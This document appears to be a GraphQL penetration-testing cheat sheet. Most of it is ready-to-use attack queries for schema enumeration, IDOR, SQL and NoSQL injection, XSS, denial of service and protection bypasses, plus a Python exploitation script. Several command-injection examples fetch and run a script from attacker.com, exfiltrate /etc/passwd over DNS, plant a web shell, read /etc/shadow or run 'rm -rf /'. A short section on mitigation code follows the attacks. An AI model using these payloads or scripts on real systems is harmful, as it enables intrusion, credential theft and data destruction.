### üõ°Ô∏è GraphQL Security Vulnerabilities

**GraphQL** is a powerful query language for APIs that enables clients to request exactly the data they need. However, its flexibility and introspection capabilities introduce unique security risks, including **information disclosure**, **broken access control**, **injection attacks**, and **denial of service**.

  * **Introspection:** A built-in feature that allows clients to query the schema, potentially exposing sensitive data and operations.
  * **Insecure Direct Object Reference (IDOR):** Occurs when an application exposes references to internal objects without proper authorization checks.
  * **GraphQL Injection:** Similar to SQL injection, where malicious input is passed to resolvers or underlying systems.
  * **Denial of Service (DoS):** Attackers can craft deeply nested or expensive queries to exhaust server resources.

-----

### üìù Introspection and Schema Disclosure

Introspection is a GraphQL feature that enables clients to query the API about its own structure. While useful for development, it can expose sensitive schema details in production if not disabled.

  * **Basic Introspection Query**

    ```graphql
    {
      __schema {
        types {
          name
          kind
          description
        }
      }
    }
    ```

    **Why it's used:** To enumerate all types defined in the GraphQL schema, including custom types like `User`, `Post`, or `AdminQuery`.
    **How it works:** The `__schema` field is a meta-field that returns the schema definition. This query lists all types, helping attackers understand the data model and potential attack vectors.

  * **Querying Field Details of a Specific Type**

    ```graphql
    {
      __type(name: "User") {
        name
        kind
        fields {
          name
          type {
            name
            kind
          }
          args {
            name
            type {
              name
              kind
            }
          }
        }
      }
    }

    # Others objects
    { __type(name: "Query") ... }
    { __type(name: "Node") ... }
    ```

    **Why it's used:** To discover fields, their data types, and arguments for a given object.
    **How it works:** Returns detailed information about a specific type including field names, types, and arguments.

  * **Get All Queries Available**

    ```graphql
    {
      __schema {
        queryType {
          fields {
            name
            description
            args {
              name
              type {
                name
              }
            }
            type {
              name
              kind
            }
          }
        }
      }
    }
    ```

    **Why it's used:** To list all available queries with their arguments and return types.
    **How it works:** Targets the `queryType` field which contains all top-level queries.

  * **Get All Mutations Available**

    ```graphql
    {
      __schema {
        mutationType {
          fields {
            name
            description
            args {
              name
              type {
                name
              }
            }
            type {
              name
              kind
            }
          }
        }
      }
    }
    ```

    **Why it's used:** To discover all mutation operations that can modify data.
    **How it works:** Similar to query enumeration but targets the `mutationType`.

  * **Get Directives Information**

    ```graphql
    {
      __schema {
        directives {
          name
          description
          locations
          args {
            name
            type {
              name
            }
          }
        }
      }
    }
    ```

    **Why it's used:** To understand custom directives that might affect authorization or data transformation.
    **How it works:** Lists all directives available in the schema with their locations and arguments.

-----

### üñºÔ∏è Insecure Direct Object Reference (IDOR)

Like REST APIs, GraphQL endpoints can suffer from broken authorization, particularly **Insecure Direct Object Reference (IDOR)**, where attackers access objects they are not authorized to view.

  * **Basic IDOR Detection Query**

    ```graphql
    # Legitimate user query
    {
      user(id: "1001") {
        id
        username
        email
      }
    }

    # Attack query - changing ID parameter
    {
      user(id: "1002") {
        id
        username
        email
        password
        isAdmin
      }
    }
    ```

    **Why it's used:** To test if changing object identifiers returns unauthorized data.
    **How it works:** Modifying the `id` parameter to access different user records.

  * **IDOR via Username Parameter**

    ```graphql
    # Original query
    {
      profile(username: "alice") {
        fullName
        email
        phone
      }
    }

    # Attack query
    {
      profile(username: "admin") {
        fullName
        email
        phone
        ssn
        creditCard
      }
    }
    ```

    **Why it's used:** Many applications use usernames as identifiers which can be enumerated.
    **How it works:** Changing the username parameter to access other users' profiles.

  * **IDOR in Nested Queries**

    ```graphql
    # Query user's own orders
    {
      me {
        orders {
          id
          total
          items {
            name
            price
          }
        }
      }
    }

    # Direct order query without user context
    {
      order(id: "ORD-78901") {
        id
        user {
          email
          address
        }
        paymentDetails {
          cardNumber
          cvv
        }
      }
    }
    ```

    **Why it's used:** Some APIs expose direct object access alongside user-context queries.
    **How it works:** Bypassing the user context and directly querying objects by ID.

  * **Batch IDOR Attack Query**

    ```graphql
    query {
      user1: user(id: "1") { email password }
      user2: user(id: "2") { email password }
      user3: user(id: "3") { email password }
      user4: user(id: "4") { email password }
      user5: user(id: "5") { email password }
    }
    ```

    **Why it's used:** To efficiently test multiple IDs in a single request.
    **How it works:** Using GraphQL aliases to query multiple objects simultaneously.

-----

### üóÉÔ∏è SQL Injection (SQLi) in GraphQL

GraphQL resolvers may pass user input directly to SQL queries, introducing classic SQL injection vulnerabilities.

  * **SQL Injection via Filter Arguments**

    ```graphql
    # Normal query
    {
      products(filter: "category:electronics") {
        name
        price
      }
    }

    # SQL injection attempt
    {
      products(filter: "category:electronics' OR '1'='1") {
        name
        price
        sku
      }
    }
    ```

    **Why it's used:** If filters are concatenated into SQL queries, injection is possible.
    **How it works:** Adding SQL logic to filter parameters to bypass conditions.

  * **Union-Based SQL Injection**

    ```graphql
    "query": "search(query: \"test' UNION SELECT username, password FROM users -- -\") { id title }"
    ```

    **Why it's used:** To extract data from other database tables.
    **How it works:** Using UNION to combine results from another table.

  * **Boolean-Based Blind SQLi**

    ```graphql
    "query": "user(id: \"1' AND SUBSTRING(database(),1,1)='a' -- -\") { id name }"
    ```

    **Why it's used:** To infer database information when errors are not visible.
    **How it works:** Using conditional statements to trigger different responses.

  * **Time-Based Blind SQLi**

    ```graphql
    "query": "product(id: \"1' AND SLEEP(5) -- -\") { id name }"
    ```

    **Why it's used:** To detect SQL injection when no output difference is visible.
    **How it works:** Using time delays to confirm injectable parameters.

-----

### üñ•Ô∏è Cross-Site Scripting (XSS) via GraphQL

GraphQL APIs may return unsanitized data that is rendered in web interfaces, leading to stored or reflected XSS.

  * **Stored XSS via Mutation**

    ```graphql
    mutation {
      createPost(
        title: "Safe Title",
        content: "<script>alert('XSS')</script>"
      ) {
        id
      }
    }
    ```

    **Why it's used:** To inject malicious scripts that persist in the database.
    **How it works:** Submitting script tags or event handlers in user-generated content.

  * **Reflected XSS in Query Arguments**

    ```graphql
    query {
      search(query: "<img src=x onerror=alert(1)>") {
        results
      }
    }
    ```

    **Why it's used:** If search results reflect the query unsafely, XSS may trigger.
    **How it works:** Injecting HTML/JavaScript in arguments that are echoed in the response.

  * **XSS via GraphQL Subscriptions**

    ```graphql
    subscription {
      newMessage(channel: "general") {
        content
        author
      }
    }
    ```

    **Why it's used:** Real-time subscriptions may deliver unsanitized content to clients.
    **How it works:** Subscribing to channels where malicious content is published.

  * **DOM XSS via Fragment Data**

    ```graphql
    query {
      userProfile {
        bio
        customHtml
      }
    }
    ```

    **Why it's used:** If `customHtml` is inserted via `innerHTML`, XSS may occur.
    **How it works:** Returning HTML or script content that is directly rendered in the DOM.

-----

### ‚öôÔ∏è Command Injection in GraphQL

GraphQL resolvers might execute system commands with user-supplied input, leading to command injection.

  * **Command Injection via System Fields**

    ```graphql
    query {
      systemInfo(command: "ls -la /etc") {
        output
      }
    }

    query {
      systemInfo(command: "cat /etc/passwd | base64") {
        output
      }
    }
    ```

    **Why it's used:** Some admin queries might execute system commands.
    **How it works:** Injecting shell commands into command parameters.

  * **Command Injection with Argument Chaining**

    ```graphql
    mutation {
      runBackup(
        command: "backup.sh; curl https://attacker.com/steal.sh | sh"
      ) {
        success
      }
    }
    ```

    **Why it's used:** To chain malicious commands after legitimate ones.
    **How it works:** Using shell operators like `;`, `&`, `|`, or `&&`.

  * **Remote Code Execution via Resolver**

    ```graphql
    mutation {
      eval(code: "require('child_process').exec('rm -rf /')") {
        result
      }
    }
    ```

    **Why it's used:** If resolvers allow dynamic code execution, RCE is possible.
    **How it works:** Submitting malicious code to be evaluated on the server.

  * **Command Injection in File Operations**

    ```graphql
    mutation {
      readFile(path: "/etc/passwd; cat /etc/shadow") {
        content
      }
    }
    ```

    **Why it's used:** File operation parameters might be concatenated into shell commands.
    **How it works:** Injecting commands after file paths.

-----

### ü§´ GraphQL Injection Attacks (Other Types)

GraphQL injection occurs when user input is passed unsafely to resolvers or underlying systems, such as databases or OS commands.

  * **NoSQL Injection**

    ```graphql
    # MongoDB injection example
    mutation {
      login(email: "admin@example.com", password: {"$ne": null}) {
        token
        user {
          role
        }
      }
    }
    ```

    **Why it's used:** GraphQL with MongoDB backends might pass objects directly to queries.
    **How it works:** Using MongoDB operators to bypass authentication.

  * **Template Injection**

    ```graphql
    mutation {
      sendEmail(
        template: "welcome",
        variables: "{{config}} {{secrets}}"
      ) {
        success
      }
    }
    ```

    **Why it's used:** If templates are rendered with user input, template injection can occur.
    **How it works:** Injecting template syntax to access internal variables.

-----

### üåÄ Denial of Service (DoS) via Query Abuse

GraphQL's flexibility allows attackers to craft queries that consume excessive resources.

  * **Circular Reference DoS Query**

    ```graphql
    query {
      categories {
        name
        products {
          name
          category {
            name
            products {
              name
              category {
                name
                products {
                  name
                }
              }
            }
          }
        }
      }
    }
    ```

    **Why it's used:** Circular relationships can cause infinite recursion or excessive data loading.
    **How it works:** Querying circular references multiple levels deep.

  * **Multiple Aliases Attack**

    ```graphql
    query {
      a1: users { id name email posts { title comments { text } } }
      a2: users { id name email posts { title comments { text } } }
      a3: users { id name email posts { title comments { text } } }
      # Repeat 100+ times
      a100: users { id name email posts { title comments { text } } }
    }
    ```

    **Why it's used:** To bypass query rate limiting by executing many operations in one request.
    **How it works:** Using aliases to execute the same expensive query multiple times.

  * **Large Array Query**

    ```graphql
    query {
      searchUsers(ids: ["1", "2", "3", "4", "5", ... up to 10000]) {
        id
        name
        friends {
          id
          name
          friends {
            id
            name
          }
        }
      }
    }
    ```

    **Why it's used:** Passing large arrays as arguments can overwhelm resolvers.
    **How it works:** The server must process each ID individually, causing resource exhaustion.

  * **Field Duplication Attack**

    ```graphql
    query {
      user(id: "1") {
        id id id id id id id id id id
        name name name name name name name
        email email email email email email
        posts {
          id id id id id
          title title title title
          comments {
            id id id id
            text text text text
          }
        }
      }
    }
    ```

    **Why it's used:** Some GraphQL implementations process duplicated fields multiple times.
    **How it works:** Requesting the same field multiple times to increase processing load.

-----

### üïµÔ∏è‚Äç‚ôÄÔ∏è Advanced Attack Scenarios

  * **Bypassing Rate Limits with Batching**

    ```graphql
    # Instead of 100 separate requests:
    query BatchAttack {
      q1: sensitiveOperation(input: "data1") { result }
      q2: sensitiveOperation(input: "data2") { result }
      q3: sensitiveOperation(input: "data3") { result }
      # ... up to 100 queries
      q100: sensitiveOperation(input: "data100") { result }
    }
    ```

  * **Information Disclosure via Error Messages**

    ```graphql
    query {
      user(id: "invalid' OR 1=1--") {
        id
        name
      }
    }
    ```

    **Why it's used:** To extract database errors that might reveal schema or system information.
    **How it works:** Crafting malformed queries to trigger verbose error messages.

  * **Union/Interface Type Exploitation**

    ```graphql
    query {
      search(query: "admin") {
        ... on User {
          username
          password
          isAdmin
        }
        ... on Post {
          content
          author {
            email
          }
        }
      }
    }
    ```

    **Why it's used:** To extract data from multiple types in a single query.
    **How it works:** Using inline fragments to query all possible return types.

  * **Directive Abuse**

    ```graphql
    query {
      users @include(if: true) {
        id
        email
      }
      config @skip(if: false) {
        apiKey
        secret
      }
    }
    ```

    **Why it's used:** To understand how directives affect query execution.
    **How it works:** Manipulating directive conditions to access protected data.

-----

### üõ°Ô∏è GraphQL Bypass Techniques and Evasion

  * **Bypassing Field Name Restrictions**

    ```graphql
    # Using aliases to access restricted fields
    query {
      user(id: "1") {
        uid: id
        mail: email
        pass: passwordHash
        admin: isAdmin
      }
    }
    ```

    **Why it's used:** Some APIs restrict certain field names but allow aliases.
    **How it works:** Renaming fields via aliases to bypass field-level restrictions.

  * **Type Name Enumeration via Errors**

    ```graphql
    query {
      __type(name: "AdminUser") {
        name
      }
    }
    ```

    **Why it's used:** To discover hidden types that aren't listed in standard introspection.
    **How it works:** Guessing type names based on naming conventions and observing error responses.

  * **Fragment Spreading for Deep Nesting**

    ```graphql
    query DeepNested {
      users {
        ...UserFields
      }
    }
    
    fragment UserFields on User {
      id
      posts {
        ...PostFields
      }
    }
    
    fragment PostFields on Post {
      id
      comments {
        ...CommentFields
      }
    }
    
    fragment CommentFields on Comment {
      id
      author {
        ...UserFields  # Circular reference
      }
    }
    ```

    **Why it's used:** To bypass depth limiters that only count query nesting levels.
    **How it works:** Using fragments to create deeply nested structures that may not be counted by simple depth validators.

  * **Operation Name Spoofing**

    ```graphql
    # Legitimate query name
    {
      "operationName": "GetPublicData",
      "query": "query GetPublicData { user(id: \"1\") { email password } }"
    }
    
    # Malicious with spoofed name
    {
      "operationName": "GetPublicData",
      "query": "query GetPublicData { adminPanel { secrets } }"
    }
    ```

    **Why it's used:** To bypass operation name-based allow lists.
    **How it works:** Using allowed operation names with malicious query bodies.

-----

### üîß GraphQL Protections and Their Bypasses

  * **Depth Limiting Bypass**

    ```graphql
    # Bypass using inline fragments
    query {
      user(id: "1") {
        ... on User {
          posts {
            ... on Post {
              comments {
                ... on Comment {
                  author {
                    ... on User {
                      posts {
                        # Continues deeply
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    ```

    **Why it's used:** Some depth limiters don't count fragment nesting correctly.
    **How it works:** Using `... on Type` syntax to create deep nesting that bypasses simple depth counters.

  * **Query Cost Analysis Evasion**

    ```graphql
    # Instead of requesting expensive nested fields:
    query EvadeCost {
      a1: user(id: "1") { id name }
      a2: user(id: "1") { id name }
      a3: user(id: "1") { id name }
      # Hundreds of aliases requesting simple fields
    }
    ```

    **Why it's used:** Cost analysis might weight nested fields heavily but not count multiple simple queries.
    **How it works:** Using many aliases with simple field requests instead of complex nested queries.

  * **Persisted Query Bypass**

    ```graphql
    # If the server accepts both persisted and regular queries:
    {
      "query": "query { __schema { types { name } } }",
      "extensions": {
        "persistedQuery": {
          "sha256Hash": "legitimate_hash_here"
        }
      }
    }
    ```

    **Why it's used:** Some implementations check persisted query hash but still process the query if present.
    **How it works:** Providing both a custom query and a legitimate hash to potentially bypass persisted query restrictions.

-----

### üì° Advanced Data Exfiltration Techniques

  * **Time-Based Data Exfiltration**

    ```graphql
    query {
      user(id: "1' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64, SLEEP(2), 0)--") {
        id
        name
      }
    }
    ```

    **Why it's used:** When traditional data return is blocked or monitored.
    **How it works:** Using time delays to infer data character by character.

  * **Error-Based Data Exfiltration**

    ```graphql
    query {
      user(id: "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users LIMIT 1), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) y)--") {
        id
        name
      }
    }
    ```

    **Why it's used:** To extract data through error messages.
    **How it works:** Forcing database errors that include sensitive data in the error response.

  * **DNS-Based Exfiltration via GraphQL**

    ```graphql
    query {
      systemInfo(command: "nslookup $(cat /etc/passwd | head -c 50).attacker.com") {
        output
      }
    }
    ```

    **Why it's used:** When outbound HTTP is blocked but DNS resolution is allowed.
    **How it works:** Embedding data in DNS queries to external domains controlled by the attacker.

-----

### üß™ Real-World GraphQL Exploit Chains

  * **From IDOR to RCE**

    ```graphql
    # Step 1: Find admin user via IDOR
    query {
      user(id: "0") {
        email
        role
      }
    }
    
    # Step 2: Discover admin mutations
    query {
      __schema {
        mutationType {
          fields {
            name
            args {
              name
              type {
                name
              }
            }
          }
        }
      }
    }
    
    # Step 3: Execute RCE via admin mutation
    mutation {
      executeCommand(
        userId: "0",
        command: "wget http://attacker.com/shell.php -O /var/www/html/shell.php"
      ) {
        result
      }
    }
    ```

  * **Bypassing Authentication via GraphQL**

    ```graphql
    # Direct database query through GraphQL resolver
    mutation {
      login(input: {
        email: {"$ne": null},
        password: {"$ne": null}
      }) {
        token
        user {
          isAdmin
        }
      }
    }
    ```

  * **Privilege Escalation via Mutation**

    ```graphql
    mutation {
      updateUserRole(
        userId: "1",
        newRole: "ADMIN"
      ) {
        success
        user {
          role
        }
      }
    }
    ```

-----

### üõ°Ô∏è Complete Prevention and Mitigation with Code Examples

  * **Query Whitelisting Example**

    ```javascript
    // Apollo Server query whitelisting
    const { ApolloServer, ValidationError } = require('apollo-server');
    
    const allowedQueries = [
      'GetUserProfile',
      'GetProducts',
      'CreateOrder'
    ];
    
    const server = new ApolloServer({
      typeDefs,
      resolvers,
      context: ({ req }) => {
        const queryName = req.body.operationName;
        if (!allowedQueries.includes(queryName)) {
          throw new ValidationError('Query not allowed');
        }
      }
    });
    ```

  * **Depth Limiting Implementation**

    ```javascript
    const depthLimit = require('graphql-depth-limit');
    
    const server = new ApolloServer({
      typeDefs,
      resolvers,
      validationRules: [depthLimit(6)],
    });
    ```

  * **Query Complexity Analysis**

    ```javascript
    const { createComplexityLimitRule } = require('graphql-validation-complexity');
    
    const complexityRule = createComplexityLimitRule(1000, {
      scalarCost: 1,
      objectCost: 5,
      listFactor: 10,
    });
    
    const server = new ApolloServer({
      typeDefs,
      resolvers,
      validationRules: [complexityRule],
    });
    ```

  * **Persisted Queries Configuration**

    ```javascript
    // Client sends query hash instead of full query
    const server = new ApolloServer({
      typeDefs,
      resolvers,
      persistedQueries: {
        cache: new RedisCache(),
      },
    });
    
    // Only predefined query hashes are accepted
    ```

  * **Input Validation Example**

    ```javascript
    const Joi = require('joi');
    
    const resolvers = {
      Query: {
        user: async (_, args) => {
          const schema = Joi.object({
            id: Joi.string().alphanum().min(1).max(10).required(),
          });
          
          const { error } = schema.validate(args);
          if (error) throw new Error('Invalid input');
          
          return getUser(args.id);
        }
      }
    };
    ```

  * **Rate Limiting Per Field**

    ```javascript
    const rateLimit = require('express-rate-limit');
    const { createRateLimitDirective } = require('graphql-rate-limit');
    
    const rateLimitDirective = createRateLimitDirective({
      identifyContext: (ctx) => ctx.userId,
    });
    
    const schema = makeExecutableSchema({
      typeDefs,
      resolvers,
      schemaDirectives: {
        rateLimit: rateLimitDirective,
      },
    });
    
    // In schema definition
    // type Query {
    //   user(id: ID!): User @rateLimit(limit: 5, duration: 60)
    // }
    ```

  * **GraphQL Security Middleware Stack**

    ```javascript
    const { ApolloServer } = require('apollo-server');
    const depthLimit = require('graphql-depth-limit');
    const { createComplexityLimitRule } = require('graphql-validation-complexity');
    
    const server = new ApolloServer({
      typeDefs,
      resolvers,
      
      // Security configurations
      validationRules: [
        depthLimit(10),
        createComplexityLimitRule(1000, {
          scalarCost: 1,
          objectCost: 5,
          listFactor: 10,
        })
      ],
      
      // Disable introspection in production
      introspection: process.env.NODE_ENV !== 'production',
      
      // Query whitelisting/blacklisting
      plugins: [
        {
          requestDidStart: async (requestContext) => {
            const { request } = requestContext;
            const blockedQueries = ['__schema', '__type'];
            
            if (blockedQueries.some(q => request.query.includes(q))) {
              throw new Error('Introspection queries are disabled');
            }
          }
        }
      ],
      
      // Context for authentication
      context: ({ req }) => {
        const token = req.headers.authorization || '';
        const user = getUserFromToken(token);
        
        if (!user) {
          throw new Error('Authentication required');
        }
        
        return { user };
      }
    });
    ```

-----

### üîç Burp Suite Testing Examples

  * **Intercepting and Modifying GraphQL**

    ```http
    POST /graphql HTTP/1.1
    Host: target.com
    Content-Type: application/json
    Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

    {
      "query": "query GetUser($id: ID!) { user(id: $id) { id email password } }",
      "variables": {
        "id": "1001"
      },
      "operationName": "GetUser"
    }
    ```

  * **Burp Intruder Payload Positions**

    ```json
    {
      "query": "query { user(id: \"¬ß1001¬ß\") { email password } }"
    }
    ```

    **Payloads:** `1001, 1002, 1003, ..., admin, root, test`

  * **Testing for Introspection**

    ```http
    POST /graphql HTTP/1.1
    Host: target.com
    Content-Type: application/json

    {"query":"{ __schema { types { name } } }"}
    ```

  * **Fuzzing Mutation Arguments**

    ```json
    {
      "query": "mutation { updateUser(id: \"1\", input: {role: \"¬ßadmin¬ß\"}) { success } }",
      "variables": {}
    }
    ```

    **Payloads:** `admin, superadmin, root, administrator`

  * **Batch Attack Testing**

    ```json
    {
      "query": "query { ¬ßa1¬ß: user(id: \"1\") { email } ¬ßa2¬ß: user(id: \"1\") { email } }",
      "variables": {}
    }
    ```

    **Payloads for aliases:** `a1,a2,a3,...,a100`

-----

### üìö Complete Attack Query Collection

  * **Full Schema Extraction**

  ```graphql
  query FullIntrospection {
    __schema {
      queryType { name }
      mutationType { name }
      subscriptionType { name }
      types {
        kind
        name
        description
        fields {
          name
          description
          args {
            name
            description
            type { name kind }
          }
          type { name kind }
        }
      }
    }
  }
  ```

  * **Sensitive Field Discovery**

  ```graphql
  query FindSensitiveFields {
    __schema {
      types {
        name
        fields {
          name
          type { name }
        }
      }
    }
  }
  ```

  * **Admin Function Detection**

  ```graphql
  query FindAdminOps {
    __schema {
      mutationType {
        fields {
          name
          description
        }
      }
    }
  }
  ```

  * **Data Relationship Mapping**

  ```graphql
  query MapRelationships {
    __schema {
      types {
        name
        fields {
          name
          type {
            name
            ofType { name }
          }
        }
      }
    }
  }
  ```

  * **Batch Enumeration Attack**

  ```graphql
  query MassEnumeration {
    u1: user(id: "1") { email password }
    u2: user(id: "2") { email password }
    u3: user(id: "3") { email password }
    # Continue for many users
    u50: user(id: "50") { email password }
  }
  ```

  * **Circular DoS Query**

  ```graphql
  query CircularDoS {
    users {
      posts {
        author {
          posts {
            author {
              posts {
                author {
                  # Continue nesting
                }
              }
            }
          }
        }
      }
    }
  }
  ```

-----

### üß¨ Advanced GraphQL Attack Tooling

  * **GraphQL Attack Framework (InQL)**

    ```bash
    # Introspection and schema analysis
    python3 inql -t http://target.com/graphql
    
    # Generate attack queries
    python3 inql -t http://target.com/graphql -generate-queries
    
    # Test for vulnerabilities
    python3 inql -t http://target.com/graphql -fuzz
    ```

  * **GraphQLmap for Exploitation**

    ```bash
    # Interactive exploitation
    python3 graphqlmap.py -u http://target.com/graphql
    
    # Dump database via SQLi
    python3 graphqlmap.py -u http://target.com/graphql --dump
    
    # Execute OS commands
    python3 graphqlmap.py -u http://target.com/graphql --os-cmd whoami
    ```

  * **Custom Python Exploitation Script**

    ```python
    import requests
    import json
    
    class GraphQLExploiter:
        def __init__(self, url):
            self.url = url
            self.session = requests.Session()
            
        def introspect(self):
            query = {
                "query": """
                {
                    __schema {
                        types {
                            name
                            fields {
                                name
                            }
                        }
                    }
                }
                """
            }
            response = self.session.post(self.url, json=query)
            return response.json()
            
        def test_idor(self, user_ids):
            for uid in user_ids:
                query = {
                    "query": f"""
                    query {{
                        user(id: "{uid}") {{
                            email
                            password
                            isAdmin
                        }}
                    }}
                    """
                }
                response = self.session.post(self.url, json=query)
                if response.status_code == 200:
                    data = response.json()
                    if 'errors' not in data:
                        print(f"Found accessible user: {uid}")
                        print(data)
                        
        def exploit_sqli(self, payload):
            query = {
                "query": f"""
                query {{
                    user(id: "{payload}") {{
                        id
                        name
                    }}
                }}
                """
            }
            response = self.session.post(self.url, json=query)
            return response.text
    
    # Usage
    exploiter = GraphQLExploiter("http://target.com/graphql")
    exploiter.test_idor(range(1, 100))
    ```

-----

**Made with love by Vishok**